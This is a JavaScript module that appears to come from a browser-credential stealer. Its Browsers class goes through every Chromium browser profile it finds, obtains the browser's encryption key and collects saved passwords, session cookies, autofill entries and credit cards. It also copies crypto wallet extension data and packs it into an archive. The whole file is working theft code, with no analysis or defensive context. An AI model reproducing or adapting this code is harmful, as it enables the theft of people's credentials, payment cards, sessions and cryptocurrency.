const { browsers } = require("../config/path");
const BrowserData = require("./BrowserData");
const path = require("path");
const fs = require("fs-extra");
const { glob } = require("glob");
const tmp = require("./tmp");
const Util = require("./Util");

class Browsers {
  static async getProfiles(target) {
    const pattern = path
      .resolve(`${target}/{Default,Profile *}`)
      .replaceAll("\\", "/");

    return await glob(pattern).catch((e) => Util.report(e, []));
  }

  static findCookie(host, name, cookies) {
    return Util.tryCatch(
      () =>
        Object.keys(cookies)
          .map((b) =>
            Object.keys(cookies[b]).map((p) =>
              cookies[b][p]
                .filter((c) => c.host === host && c.name === name)
                .map((c) => c.value)
            )
          )
          .flat(Infinity),
      []
    );
  }

  static async passwords() {
    const passwords = {};
    const sites = [];

    for (const [name, browser] of Object.entries(browsers.chromium)) {
      try {
        if (!fs.pathExistsSync(browser.target)) continue;

        const stat = await fs.lstat(browser.target).catch(Util.report);

        if (!stat || !stat.isDirectory()) continue;

        const key = await BrowserData.getEncryptKey(browser.target).catch(
          Util.report
        );

        if (!key) continue;

        const browserPasswords = {};

        if (browser.singleProfile) {
          const data = await BrowserData.getPasswords(browser.target, key);

          if (!Array.isArray(data?.passwords) || !data.passwords.length)
            continue;

          browserPasswords["Default"] = data.passwords;
          sites.push(...data.sites);
        } else {
          const pattern = path
            .resolve(`${browser.target}/{Default,Profile *}`)
            .replaceAll("\\", "/");

          const profiles = await glob(pattern).catch((e) => Util.report(e, []));

          for (const profile of profiles) {
            const data = await BrowserData.getPasswords(profile, key);

            if (!Array.isArray(data?.passwords) || !data.passwords.length)
              continue;

            browserPasswords[path.basename(profile)] = data.passwords;
            sites.push(...data.sites);
          }
        }

        passwords[name] = browserPasswords;
      } catch (e) {
        Util.report(e);
        continue;
      }
    }

    return { passwords, sites };
  }

  static async cookies() {
    const cookies = {};
    let count = 0;

    for (const [name, browser] of Object.entries(browsers.chromium)) {
      try {
        if (!fs.pathExistsSync(browser.target)) continue;

        const stat = await fs.lstat(browser.target).catch(Util.report);

        if (!stat || !stat.isDirectory()) continue;

        const key = await BrowserData.getEncryptKey(browser.target).catch(
          Util.report
        );

        if (!key) continue;

        const browserCookies = {};

        if (browser.singleProfile) {
          const data = await BrowserData.getCookies(
            browser.target,
            key,
            browser.program
          );

          if (!Array.isArray(data) || !data.length) continue;

          browserCookies["Default"] = data;
          count = count + data.length;
        } else {
          const pattern = path
            .resolve(`${browser.target}/{Default,Profile *}`)
            .replaceAll("\\", "/");

          const profiles = await glob(pattern).catch((e) => Util.report(e, []));

          for (const profile of profiles) {
            const data = await BrowserData.getCookies(
              profile,
              key,
              browser.program
            );

            if (!Array.isArray(data) || !data.length) continue;

            browserCookies[path.basename(profile)] = data;
            count = count + data.length;
          }
        }

        cookies[name] = browserCookies;
      } catch (e) {
        Util.report(e);
        continue;
      }
    }

    return { cookies, count };
  }

  static async webdata() {
    const autofill = {};
    const cards = {};
    let cardCount = 0;

    for (const [name, browser] of Object.entries(browsers.chromium)) {
      try {
        if (!fs.pathExistsSync(browser.target)) continue;

        const stat = await fs.lstat(browser.target).catch(Util.report);

        if (!stat || !stat.isDirectory()) continue;

        const key = await BrowserData.getEncryptKey(browser.target).catch(
          Util.report
        );

        if (!key) continue;

        const browserAutofill = {};
        const browserCards = {};

        if (browser.singleProfile) {
          const data = await BrowserData.getWebdata(
            browser.target,
            key,
            browser.program
          );
          const pname = "Default";

          if (Array.isArray(data?.autofill))
            browserAutofill[pname] = data.autofill;

          if (Array.isArray(data?.cards)) {
            browserCards[pname] = data.cards;
            cardCount = cardCount + data.cards.length;
          }
        } else {
          const pattern = path
            .resolve(`${browser.target}/{Default,Profile *}`)
            .replaceAll("\\", "/");

          const profiles = await glob(pattern).catch((e) => Util.report(e, []));

          for (const profile of profiles) {
            const data = await BrowserData.getWebdata(
              profile,
              key,
              browser.program
            );
            const pname = path.basename(profile);

            if (Array.isArray(data?.autofill))
              browserAutofill[pname] = data.autofill;

            if (Array.isArray(data?.cards)) {
              browserCards[pname] = data.cards;
              cardCount = cardCount + data.cards.length;
            }
          }
        }

        autofill[name] = browserAutofill;
        cards[name] = browserCards;
      } catch (e) {
        Util.report(e);
        continue;
      }
    }

    return { autofill, cards, cardCount };
  }

  static async wallets(outDir) {
    const tempDir = await fs.ensureDir(path.join(tmp.dir, "wallets"));
    const wallets = [];

    for (const [name, browser] of Object.entries(browsers.chromium)) {
      try {
        if (!fs.pathExistsSync(browser.target)) continue;

        const stat = await fs.lstat(browser.target).catch(Util.report);

        if (!stat || !stat.isDirectory()) continue;

        const tempBrowserDir = path.join(tempDir, name);

        if (browser.singleProfile) {
          const profileWallets = await BrowserData.getAndSaveWallets(
            browser.target,
            path.join(tempBrowserDir, "Default"),
            browser.program
          );

          if (!profileWallets) continue;

          for (const [w, e] of Object.entries(profileWallets))
            if (e) wallets.push(w);
        } else {
          for (const profile of await Browsers.getProfiles(browser.target)) {
            const profileWallets = await BrowserData.getAndSaveWallets(
              profile,
              path.join(tempBrowserDir, path.basename(profile)),
              browser.program
            );

            if (!profileWallets) continue;

            for (const [w, e] of Object.entries(profileWallets))
              if (e) wallets.push(w);
          }
        }
      } catch (e) {
        Util.report(e);
        continue;
      }
    }

    await Util.tarc(tempDir, path.join(outDir, "wallets.tgz"));

    return wallets;
  }
}

module.exports = Browsers;
